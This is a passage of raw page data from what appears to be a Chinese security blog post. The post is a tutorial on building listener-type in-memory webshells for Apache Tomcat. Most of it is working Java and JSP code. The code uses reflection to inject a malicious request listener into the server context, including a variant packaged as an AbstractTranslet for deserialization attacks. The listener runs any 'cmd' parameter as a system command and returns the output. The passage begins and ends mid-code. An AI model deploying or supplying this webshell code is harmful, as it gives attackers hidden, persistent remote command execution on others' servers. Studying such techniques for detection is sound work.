modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedRequest.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedRequest.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedRequest.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //初始化初始化lastServicedResponse</span><br><span class=\"line\">            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedResponse.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedResponse.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedResponse.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>写一下第二步的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\">import org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import javax.servlet.ServletContext;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        //获取request和response</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field context= null;</span><br><span class=\"line\">            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            context.setAccessible(true);</span><br><span class=\"line\">            ThreadLocal threadLocal=(ThreadLocal) context.get(null);</span><br><span class=\"line\">            ServletRequest request=null;</span><br><span class=\"line\">            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;</span><br><span class=\"line\">                request= (ServletRequest) threadLocal.get();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(request!=null)&#123;</span><br><span class=\"line\">                //获取context</span><br><span class=\"line\">                ServletContext servletContext=request.getServletContext();</span><br><span class=\"line\">                if(servletContext!=null)&#123;</span><br><span class=\"line\">                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    appctx.setAccessible(true);</span><br><span class=\"line\">                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    stdctx.setAccessible(true);</span><br><span class=\"line\">                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    //注入listener</span><br><span class=\"line\">                    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">                    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">                    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">                    listenerList.add(new ListenerInject());</span><br><span class=\"line\">                    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            System.out.println(cmd);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功注入，over</p>\n<h3 id=\"另一种动态注入listener的方式\"><a href=\"#另一种动态注入listener的方式\" class=\"headerlink\" title=\"另一种动态注入listener的方式\"></a>另一种动态注入listener的方式</h3><p>我发现有一个<code>addApplicationEventListener</code> 方法，可以直接将对象插进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">standardContext.addApplicationEventListener(new Testlistener());</span><br></pre></td></tr></table></figure>\n\n<p>所以我们的jsp马就可以简化成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //注入listener</span><br><span class=\"line\">    standardContext.addApplicationEventListener(new Testlistener());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之前学了 filter 型的内存马，现在继续学习 listener 型</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>前面的 <code>filter</code> 内存马是通过动态注册恶意的 <code>filter</code> 来实现一个 <code>webshell</code> ，这个 <code>listener</code> 内存马原理其实也差不多，就是动态注册一个恶意的 <code>listener</code> 。</p>\n<h3 id=\"构造恶意Listener\"><a href=\"#构造恶意Listener\" class=\"headerlink\" title=\"构造恶意Listener\"></a>构造恶意Listener</h3><p>这个恶意的 <code>Listener</code> 要实现一个webshell的功能，就需要获取到 <code>request</code> 对象，现在来看一下怎么构造出这个恶意 <code>Listener</code></p>\n<p><code>requestInitialized</code> 方法只有一个<code>ServletRequestEvent</code> 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 <code>ServletRequestEvent</code> 对象中来获取 <code>request</code> 对象。</p>\n<p>可以看到该对象有一个 <code>getServletRequest</code> 方法，看起来就跟 <code>request</code> 对象有关</p>\n<p>可以看到返回了一个 <code>ServletRequest</code> 接口的实现类的对象，测试一下看看具体返回的哪个类的对象</p>\n<p>可以看到是 <code>org.apache.catalina.connector.RequestFacade</code> 的对象，看看他有哪些属性</p>\n<p>发现其有 <code>request</code> 属性是 <code>Request</code> 类型的，那么我们就可以通过反射来获取该属性的值</p>\n<p>开始构造恶意 <code>Listener</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.Filter;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功</p>\n<h3 id=\"实现动态注册Listener\"><a href=\"#实现动态注册Listener\" class=\"headerlink\" title=\"实现动态注册Listener\"></a>实现动态注册Listener</h3><p>现在来理一下 <code>Listener</code> 的注册流程</p>\n<p>先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。</p>\n<p>在 <code>StandardContext$listenerStart</code>进行实例化，我们跟踪一下 <code>listeners</code> 的来源</p>\n<p><code>listeners</code> 是一个 <code>String</code> 类型的数组，存储了 <code>listener</code> 的名字,通过 <code>findApplicationListeners</code> 方法获取值</p>\n<p><code>results</code> 数组用来存储已经实例化的 <code>listener</code> 对象，然后继续看</p>\n<p>将 <code>results</code> 中的 <code>listener</code> 分类存放，我们的 <code>TestListener</code> 就被分到了 <code>eventListeners</code> 中</p>\n<p>然后调用 <code>getApplicationEventListeners</code> 获取 <code>applicationEventListenersList</code> ，就是已注册的 <code>applicationEventListener</code> ，并将其添加到我们的 <code>eventListeners</code> 中。之后再调用 <code>setApplicationEventListeners</code> 将<code>eventListeners</code> 设置为<code>ApplicationEventListeners</code> 。刚看到时我在想，为什么要将已有的<code>applicationEventListener</code> 取出来，然后再 <code>set</code> 呢，这不会重复吗，随后跟进一下 <code>setApplicationEventListeners</code> 方法的源码就知道了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setApplicationEventListeners(Object[] listeners) &#123;</span><br><span class=\"line\">        this.applicationEventListenersList.clear();</span><br><span class=\"line\">        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;</span><br><span class=\"line\">            this.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>该方法首先会清空 <code>applicationEventListenersList</code> ，然后再进行添加。</p>\n<p>然后 <code>instance</code> 这个数组就会获取所有已注册的 <code>lsitener</code> ，且是已实例化的 <code>listener</code> ，然后就是一些其他的处理了，这里不再关注。</p>\n<p>继续看第二个断点</p>\n<p>可以看到对 <code>requestInitialized</code> 方法的调用是在 <code>StandardContext$fireRequestInitEvent</code> 中进行的，这个 <code>listener</code> 是从 <code>instances</code> 数组中得到的，而<code>instances</code> 又是调用<code>getApplicationEventListeners</code> 方法获取的</p>\n<p>那么其实我们如果将恶意 <code>listener</code> 添加到这个 list中就可以了，就像这样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">listenerList.add(new Testlistener());</span><br><span class=\"line\">standardContext.setApplicationEventListeners(listenerList.toArray());</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JSP实现内存马注入\"><a href=\"#JSP实现内存马注入\" class=\"headerlink\" title=\"JSP实现内存马注入\"></a>JSP实现内存马注入</h3><p>先使用 <code>JSP</code> 实现内存马的注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span 